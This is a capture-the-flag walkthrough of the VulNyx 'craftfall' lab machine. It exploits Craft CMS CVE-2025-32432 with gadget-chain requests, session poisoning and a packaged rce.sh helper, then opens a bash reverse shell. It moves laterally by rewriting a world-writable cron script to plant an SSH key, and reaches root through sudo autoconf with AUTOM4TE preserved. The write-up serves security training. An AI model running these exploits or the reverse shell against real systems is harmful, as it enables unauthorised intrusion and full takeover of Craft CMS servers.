# craftfall

## Executive Summary

| Machine | OS | Author | Category | Platform |
| :--- | :--- | :--- | :--- | :--- |
| craftfall | Linux | zer0arc4 | Easy | VulNyx |

**Summary:** The craftfall machine exposes OpenSSH 10.0p2 on port 22 and Apache httpd 2.4.68 on port 80 that redirects visitors to the virtual host `craft.nyx`. Response headers identified the site as a Craft CMS installation, and a quick test of the legacy CVE 2023 41892 gadget chain was rejected with HTTP 400, so exploitation focused on the preauthentication flaw in Craft CMS 5.6.16 tracked as CVE 2025 32432. Harvesting the CSRF token from the login page and posting a crafted `handle` object to the `generate-transform` action instantiated a `GuzzleHttp\Psr7\FnStream` gadget that executed `phpinfo`, disclosing the session save path at `/var/lib/php/sessions`. A PHP evaluation stub was then smuggled into the session file through an unencoded `returnUrl` parameter, and a second request to the same action registered a `yii\rbac\PhpManager` behavior configured to require the poisoned session file, which evaluated the stub and delivered arbitrary command execution as `www-data`. A helper script chained the three phases and launched a Penelope reverse shell. Process monitoring with pspy64 revealed a world writable scheduled script at `/usr/local/bin/zer0arc4-job.sh` running as user `zer0arc4`, which was overwritten to inject an SSH public key into the user's `authorized_keys` and secure an interactive session. Sudo enumeration then showed that `zer0arc4` could run `/usr/bin/autoconf` as root with the `AUTOM4TE` environment variable preserved, so pointing `AUTOM4TE` at a script that wrote a passwordless sudoers entry completed the escalation to root and exposed both flags.

---

## Reconnaissance

The engagement commenced on the VirtualBox host only subnet `192.168.56.0/24`, with the attacker machine operating from `192.168.56.1` and the target awaiting identification.

1. An initial ARP ping sweep located the active hosts on the subnet, identifying the target machine at `192.168.56.208`:

```zsh
❯ sudo nmap -sn -PR 192.168.56.0/24
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-24 09:44 +0700
Nmap scan report for 192.168.56.100
Host is up (0.00036s latency).
MAC Address: 08:00:27:11:82:01 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.208
Host is up (0.00068s latency).
MAC Address: 08:00:27:C5:59:9C (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 4.93 seconds
```

The sweep found one VirtualBox guest besides the attacker host, and the address `192.168.56.208` was taken as the target for the remainder of the assessment.

2. The target address was stored in a shell variable and subjected to a full TCP port scan across all 65535 ports:

```zsh
❯ ip=192.168.56.208
```

```zsh
❯ nmap -p- -Pn $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-24 09:45 +0700
Nmap scan report for 192.168.56.208
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.39 seconds
```

Only two TCP services were exposed, SSH on port 22 and HTTP on port 80, pointing the entire assessment at the web application.

3. Service and version detection was run against both open ports:

```zsh
❯ nmap -p 22,80 -sCV -Pn --min-rate 5000 $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-09-24 09:47 +0700
Nmap scan report for 192.168.56.208
Host is up (0.0012s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 7+deb13u4 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.68
|_http-server-header: Apache/2.4.68 (Debian)
|_http-title: Did not follow redirect to http://craft.nyx/
Service Info: Host: 192.168.1.82; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.51 seconds
```

Version detection fingerprinted OpenSSH 10.0p2 on Debian and Apache httpd 2.4.68, with the HTTP service redirecting to the virtual host `craft.nyx`, which required a hosts file mapping before further interaction.

4. The virtual host was mapped in `/etc/hosts` and the base URL was stored in a shell variable:

```zsh
❯ echo '192.168.56.208 craft.nyx' | sudo tee -a /etc/hosts
192.168.56.208 craft.nyx
```

```zsh
❯ url=http://craft.nyx/
```

5. A HEAD request against the root URL revealed the technology stack:

```zsh
❯ curl -sS -I $url
HTTP/1.1 200 OK
Date: Thu, 24 Sep 2026 02:51:18 GMT
Server: Apache/2.4.68 (Debian)
X-Robots-Tag: none
X-Powered-By: Craft CMS
Content-Type: text/html; charset=UTF-8
```

The `X-Powered-By` header disclosed that the application is a Craft CMS installation, a PHP content management platform with a history of deserialization flaws, which immediately framed the attack surface.

6. The administrative panel was confirmed by requesting `/admin`, which redirected to the login page:

```zsh
❯ curl -sS -I $url/admin | grep -iE 'HTTP|location'
HTTP/1.1 302 Found
Location: http://craft.nyx/admin/login
```

The redirect confirmed a reachable admin backend at `/admin/login`, protecting the application's privileged actions behind session authentication and CSRF tokens.

---

## Initial Access

### Craft CMS Fingerprint and Legacy Gadget Check

7. With Craft CMS confirmed, a quick check of the older vulnerability CVE 2023 41892 was fired against `index.php`, attempting the classic `conditions/render` gadget chain:

```zsh
❯ curl -s -X POST "$url/index.php" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    --data 'action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream","__construct()":[{"close":null}],"_fn_close":"phpinfo"}}' \
    -o /dev/null -w '%{http_code}\n'
400
```

The server answered with HTTP 400, indicating that this build rejected the legacy `conditions/render` payload, so the older entry point was closed and a newer flaw was required.

### Preauthentication RCE through CVE 2025 32432

8. Attention moved to the Craft CMS flaw tracked as CVE 2025 32432, which abuses the `generate-transform` action. The action requires a valid session and CSRF token, so a session was established against the login page and its CSRF token was harvested from the embedded `csrfTokenValue` value:

```zsh
❯ token=$(curl -sS -c /tmp/c.jar "$url/admin/login" | grep -oE '"csrfTokenValue":"[^"]+"' | sed 's/.*:"//;s/"$//')
```

```zsh
❯ echo $token | head -c 25; echo
kcZqdGNG9WOUbsPv3soBLuHUy
```

The token `kcZqdGNG9WOUbsPv3soBLuHUy` was stored in a shell variable alongside the session cookie jar, ready for the exploit request.

9. The token was used to POST a crafted `handle` object to the `generate-transform` action. The payload registers a `FieldLayoutBehavior` whose instantiated class resolves to a `GuzzleHttp\Psr7\FnStream` that calls `phpinfo` when the stream is closed:

```zsh
curl -s -b /tmp/c.jar -X POST "$url/index.php?p=admin/actions/assets/generate-transform" \
    -H "X-CSRF-Token: $token" -H 'Content-Type: application/json' \
    --data '{"assetId": 1, "handle": {"width": 123, "height": 123, "as session": {"class": "craft\\behaviors\\FieldLayoutBehavior", "__class": "GuzzleHttp\\Psr7\\FnStream", "__construct()": [[]], "_fn_close": "phpinfo"}}}' \
    -o /tmp/phpinfo.html -w '%{http_code} %{size_download} bytes\n'
```

The response body was saved locally as `/tmp/phpinfo.html`, and the behavior instantiation had already executed the attacker supplied callback without requiring any authentication.

10. The saved response was checked for rendered phpinfo output:

```zsh
❯ grep -c 'PHP Version' /tmp/phpinfo.html
2
```

Two occurrences of `PHP Version` confirmed that the endpoint had rendered a full phpinfo page into `/tmp/phpinfo.html`, establishing a code execution primitive that could invoke arbitrary PHP functions by name.

11. The phpinfo output was parsed for the values that would shape the next stage:

```zsh
❯ grep -oE '\$_SERVER\[.DOCUMENT_ROOT.\][^<]*<[^>]*>[^<]*' /tmp/phpinfo.html | head -1
$_SERVER['DOCUMENT_ROOT']</td>
```

```zsh
❯ grep -A2 'session.save_path' /tmp/phpinfo.html | sed 's/<[^>]*>/ /g' | head -2
  session.save_path  /var/lib/php/sessions  /var/lib/php/sessions
  session.serialize_handler  php  php
```

```zsh
❯ grep -ic imagick /tmp/phpinfo.html
0
```

The document root row was extracted as a reference for the installation path, and the session save path was disclosed as `/var/lib/php/sessions`, the directory holding one session file per `CraftSessionId` cookie. The imagick extension search returned zero matches, so the imagick based file read variant of this flaw was unavailable and the session file route was selected instead.

### Session Poisoning and PhpManager Gadget Execution

12. The exploitation plan required a server side file containing attacker controlled PHP. Craft persists the `returnUrl` of a request inside its session file, and curl's `--request-target` option combined with the `-g` switch allowed the URL to carry an unencoded PHP stub. Requesting the dashboard with the stub embedded in the `z9` parameter stored it verbatim in the session:

```zsh
❯ curl -sSg --request-target '/index.php?p=admin/dashboard&z9=<?=eval($_GET["z9"]);die();?>' \
    -c /tmp/cr.jar "$url/index.php" -o /dev/null
```

The response cookies were written to `/tmp/cr.jar`, and the session file on the server now contained the serialized `returnUrl` value with the embedded `<?=` stub awaiting execution.

13. The session identifier was read from the cookie jar, since the session file on disk is named after it:

```zsh
❯ sid=$(grep -i CraftSessionId /tmp/cr.jar | awk '{print $NF}'); echo $sid
2343ccfdc5483e2c247c14505d2df882
```

14. A fresh CSRF token was harvested within the same poisoned session:

```zsh
❯ token=$(curl -s -b /tmp/cr.jar -c /tmp/cr.jar "$url/admin/login" | grep -oE '"csrfTokenValue":"[^"]+"' | sed 's/.*:"//;s/"$//')
```

15. The final request invoked `generate-transform` once more, this time registering a `yii\rbac\PhpManager` behavior whose `itemFile` points at the poisoned session file. PhpManager loads its item file with a PHP `require`, so the serialized session data was parsed as code, and the embedded stub evaluated the `z9` query parameter:

```zsh
❯ curl -s -b /tmp/cr.jar -g \
    --request-target "/index.php?p=admin/actions/assets/generate-transform&z9=system(%22id%22)%3B" \
    -H "X-CSRF-Token: $token" -H 'Content-Type: application/json' \
    --data '{"assetId": 1, "handle": {"width": 1, "height": 1, "as s1": {"class": "craft\\behaviors\\FieldLayoutBehavior", "__class": "yii\\rbac\\PhpManager", "__construct()": [{"itemFile": "/var/lib/php/sessions/sess_'"$sid"'"}]}}}' \
    "$url/index.php"
0ab40f3d083ce764c590df0d723dce0e__flash|a:0:{}e93622983b782ba43e9ccafe53e5a0a3__returnUrl|s:77:"http://craft.nyx/index.php?p=admin/dashboard&z9=uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The response echoed the raw session file contents, and the `returnUrl` string was visibly truncated where `system("id")` executed, printing `uid=33(www-data) gid=33(www-data) groups=33(www-data)` inline. Arbitrary command execution as `www-data` was confirmed.

### Packaging the Exploit and Establishing the Reverse Shell

16. The three phase exploit was consolidated into a reusable helper script, where phase A poisons the session, phase B harvests the CSRF token, and phase C triggers the PhpManager gadget with the requested command double base64 encoded to survive URL transport:

```zsh
❯ cat > rce.sh <<'EOF'
#!/usr/bin/env bash
# Craftfall — CVE-2025-32432 RCE helper (execute commands as www-data)
# usage: ./rce.sh 'shell command here'
url=http://craft.nyx/
jar=/tmp/cr.jar

# A) Poison session: insert PHP stub into returnUrl
curl -sSg --request-target '/index.php?p=admin/dashboard&z9=<?=eval($_GET["z9"]);die();?>' \
  -c "$jar" "$url/index.php" -o /dev/null
sid=$(grep -i CraftSessionId "$jar" | awk '{print $NF}')

# B) Get CSRF token from the same session
token=$(curl -s -b "$jar" -c "$jar" "$url/admin/login" \
  | grep -oE '"csrfTokenValue":"[^"]+"' | sed 's/.*:"//;s/"$//')

# C) PhpManager -> require session file -> eval payload z9 (double base64)
inner=$(printf '%s' "$1" | base64 -w0)
php=$(printf 'system(base64_decode("%s"));' "$inner" | base64 -w0)
curl -s -m 25 -b "$jar" -g \
  --request-target "/index.php?p=admin/actions/assets/generate-transform&z9=eval(base64_decode(%22$php%22))%3B" \
  -H "X-CSRF-Token: $token" -H 'Content-Type: application/json' \
  --data '{"assetId": 1, "handle": {"width": 1, "height": 1, "as s1": {"class": "craft\\behaviors\\FieldLayoutBehavior", "__class": "yii\\rbac\\PhpManager", "__construct()": [{"itemFile": "/var/lib/php/sessions/sess_'"$sid"'"}]}}}' \
  "$url/index.php" | sed 's/.*dashboard&z9=//'
EOF

❯ chmod +x rce.sh
```

The helper reproduced the manual chain end to end, accepted any shell command as an argument, and trimmed the response down to the command output.

17. A first execution confirmed the primitive and fingerprinted the target:

```zsh
❯ ./rce.sh 'id;hostname -i;cat /etc/os-release'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
127.0.1.1
PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
NAME="Debian GNU/Linux"
VERSION_ID="13"
VERSION="13 (trixie)"
VERSION_CODENAME=trixie
DEBIAN_VERSION_FULL=13.7
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"
```

Commands were executing reliably as `www-data` on a Debian 13 trixie host, so the next move was converting the primitive into an interactive shell.

18. A Penelope listener was started on port 6666:

```zsh
❯ penelope -p 6666
...
```

19. The helper launched a bash reverse shell toward the attacker host, and the listener caught the callback immediately:

```zsh
❯ ./rce.sh 'bash -c "bash -i >& /dev/tcp/192.168.56.1/6666 0>&1"'
```

```zsh
...
[+] [New Reverse Shell] => Craftfall 192.168.56.208 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
...
www-data@Craftfall:/var/www/craft/web$ cat /etc/passwd | grep "sh$"
root:x:0:0:root:/root:/bin/bash
zer0arc4:x:1000:1000:zer0arc4,,,:/home/zer0arc4:/bin/bash
```

An interactive shell was established as `www-data` on the host `Craftfall`, with the web root sitting at `/var/www/craft/web`. The `/etc/passwd` grep showed a single interactive user besides root, `zer0arc4`, marking the lateral target.

---

## Lateral Movement

### World Writable Scheduled Script and SSH Key Injection

20. The home directory of `zer0arc4` existed but carried restrictive permissions, so its contents were out of reach from the web shell:

```zsh
www-data@Craftfall:/tmp$ ls -la /home
total 12
drwxr-xr-x  3 root     root     4096 Sep 19 15:28 .
drwxr-xr-x 18 root     root     4096 Sep 19 13:42 ..
drwx------  4 zer0arc4 zer0arc4 4096 Sep 21 03:52 zer0arc4
```

21. To hunt for scheduled activity, `pspy64` was transferred from the attacker machine. A Python HTTP server was started on the attacker host:

```zsh
❯ python3 -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
192.168.56.208 - - [24/Sep/2026 10:10:46] "GET /pspy/pspy64 HTTP/1.1" 200 -
```

and the binary was pulled onto the target and made executable:

```zsh
www-data@Craftfall:/tmp$ wget http://192.168.56.1:9999/pspy/pspy64
--2026-09-23 23:10:45--  http://192.168.56.1:9999/pspy/pspy64
Connecting to 192.168.56.1:9999... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3104768 (3.0M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                     100%[======================================>]   2.96M  --.-KB/s    in 0.02s

2026-09-23 23:10:45 (133 MB/s) - ‘pspy64’ saved [3104768/3104768]

www-data@Craftfall:/tmp$ chmod +x pspy64
```

22. Process monitoring quickly surfaced a scheduled task executing as UID 1000:

```zsh
www-data@Craftfall:/tmp$ ./pspy64
...
2026/09/23 23:12:02 CMD: UID=1000  PID=1262   | /bin/bash /usr/local/bin/zer0arc4-job.sh
...
```

The job ran `/usr/local/bin/zer0arc4-job.sh` as UID 1000, the uid of `zer0arc4`, presenting a code execution primitive in that user's context if the script could be modified.

23. The permissions of the scheduled script were inspected:

```zsh
www-data@Craftfall:/tmp$ ls -la /usr/local/bin/zer0arc4-job.sh
-rwxrwxrwx 1 zer0arc4 zer0arc4 348 Sep 20 10:03 /usr/local/bin/zer0arc4-job.sh
```

The script carried the `rwxrwxrwx` mask and was owned by `zer0arc4`, meaning any local user, including `www-data`, could rewrite it entirely.

24. Reading the script revealed a logging task plus a note from the machine author confirming the intended vulnerability:

```zsh
www-data@Craftfall:/tmp$ cat /usr/local/bin/zer0arc4-job.sh
#!/bin/bash

echo "zer0arc4 scheduled task executed: $(date)" >> /tmp/zer0arc4-job.log


#	Hi dude,

#	The machine is almost 70% complete! The actual vulnerability is in Craft CMS 5.6.16 itself.

#	Make sure to escalate to root to fully complete the machine.

#	Feel free to share your feedback or suggestions on Discord.

#	Thanks!
#	�- zer0arc4.
```

The note confirmed that the actual vulnerability is the one exploited earlier, CVE 2025 32432 in Craft CMS 5.6.16, validating the attack path taken so far.

25. Rather than chaining commands through the cron job, the attacker prepared a persistent SSH foothold. A fresh ed25519 key pair was generated:

```zsh
❯ ssh-keygen -t ed25519 -f key -N '' -q
```

and the public half was displayed for injection:

```zsh
❯ cat key.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFYse+l39h0I4dPnQAusuIWE11sFOK0ii/b4DDizfyxV setyanoegraha@archlinux
```

26. The world writable script was overwritten with commands that create the `.ssh` directory for `zer0arc4`, append the public key to `authorized_keys`, and enforce the correct permissions:

```zsh
www-data@Craftfall:/tmp$ echo '#!/bin/bash' > /usr/local/bin/zer0arc4-job.sh
www-data@Craftfall:/tmp$ echo 'mkdir -p /home/zer0arc4/.ssh' >> /usr/local/bin/zer0arc4-job.sh
www-data@Craftfall:/tmp$ echo 'echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFYse+l39h0I4dPnQAusuIWE11sFOK0ii/b4DDizfyxV setyanoegraha@archlinux" >> /home/zer0arc4/.ssh/authorized_keys' >> /usr/local/bin/zer0arc4-job.sh
www-data@Craftfall:/tmp$ echo 'chmod 700 /home/zer0arc4/.ssh && chmod 600 /home/zer0arc4/.ssh/authorized_keys' >> /usr/local/bin/zer0arc4-job.sh
www-data@Craftfall:/tmp$ cat /usr/local/bin/zer0arc4-job.sh
#!/bin/bash
mkdir -p /home/zer0arc4/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFYse+l39h0I4dPnQAusuIWE11sFOK0ii/b4DDizfyxV setyanoegraha@archlinux" >> /home/zer0arc4/.ssh/authorized_keys
chmod 700 /home/zer0arc4/.ssh && chmod 600 /home/zer0arc4/.ssh/authorized_keys
```

The next scheduled run would execute this payload in the context of `zer0arc4`, planting the attacker's public key inside the user's home directory.

27. Once the task fired, the attacker connected directly over SSH with the matching private key:

```zsh
❯ ssh -i key zer0arc4@$ip
zer0arc4@Craftfall:~$ id
uid=1000(zer0arc4) gid=1000(zer0arc4) groups=1000(zer0arc4),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),101(netdev),104(bluetooth)
```

The key was accepted and an interactive session was established as `zer0arc4`, completing the lateral move from `www-data`.

---

## Privilege Escalation

### Sudo Autoconf with a Preserved AUTOM4TE Variable

28. Sudo privileges for `zer0arc4` were enumerated:

```zsh
zer0arc4@Craftfall:~$ sudo -l
Matching Defaults entries for zer0arc4 on Craftfall:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty,
    env_keep+=AUTOM4TE

User zer0arc4 may run the following commands on Craftfall:
    (root) NOPASSWD: /usr/bin/autoconf
```

The sudoers policy permitted passwordless execution of `/usr/bin/autoconf` as root, and critically the `env_keep+=AUTOM4TE` default preserved the `AUTOM4TE` environment variable across the sudo boundary. Since `autoconf` delegates its macro processing to the binary named by `AUTOM4TE`, the variable offered a direct path to root command execution.

29. A payload script writing a passwordless sudoers entry was prepared, and an empty `configure.ac` satisfied autoconf's input expectations before invoking it with the malicious `AUTOM4TE` override:

```zsh
zer0arc4@Craftfall:~$ echo '#!/bin/sh' > /tmp/pwn.sh
zer0arc4@Craftfall:~$ echo 'echo "zer0arc4 ALL=(ALL:ALL) NOPASSWD:ALL" > /etc/sudoers.d/zer0arc4' >> /tmp/pwn.sh
zer0arc4@Craftfall:~$ chmod +x /tmp/pwn.sh
zer0arc4@Craftfall:~$ touch configure.ac
zer0arc4@Craftfall:~$ sudo AUTOM4TE=/tmp/pwn.sh autoconf
```

Instead of the genuine `autom4te` interpreter, autoconf invoked `/tmp/pwn.sh` with root privileges, writing `zer0arc4 ALL=(ALL:ALL) NOPASSWD:ALL` into `/etc/sudoers.d/zer0arc4`.

30. With the sudoers drop in file written by root, a full root session was a single command away:

```zsh
zer0arc4@Craftfall:~$ sudo -i
root@Craftfall:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
Craftfall
root@Craftfall:~# cat /home/zer0arc4/user.txt /root/root.txt
f90...
b0c...
```

The `id` output confirmed uid 0, completing the compromise of the craftfall machine with both `user.txt` and `root.txt` retrieved.

---

## Attack Chain Summary

1. **Reconnaissance**: An ARP sweep located the target at `192.168.56.208`, and port scanning revealed OpenSSH on port 22 and Apache httpd 2.4.68 on port 80 redirecting to the virtual host `craft.nyx`.
2. **Vulnerability Discovery**: Response headers fingerprinted the application as Craft CMS, the legacy CVE 2023 41892 chain was rejected with HTTP 400, and the `generate-transform` action proved vulnerable to the preauthentication flaw CVE 2025 32432 in Craft CMS 5.6.16.
3. **Exploitation**: A CSRF protected request instantiated a `GuzzleHttp\Psr7\FnStream` gadget that ran `phpinfo`, and a PHP stub smuggled into the session `returnUrl` was executed by a `yii\rbac\PhpManager` behavior requiring the poisoned session file, yielding command execution as `www-data` and a Penelope reverse shell.
4. **Internal Enumeration**: pspy64 process monitoring exposed a scheduled script at `/usr/local/bin/zer0arc4-job.sh` executing as UID 1000 with world writable permissions, alongside a single interactive user, `zer0arc4`.
5. **Privilege Escalation**: The scheduled script was overwritten to inject an SSH public key into `zer0arc4`'s `authorized_keys`, and sudo enumeration showed `/usr/bin/autoconf` runnable as root with the `AUTOM4TE` variable preserved, so a malicious `autom4te` replacement wrote a passwordless sudoers entry and granted full root access to both flags.
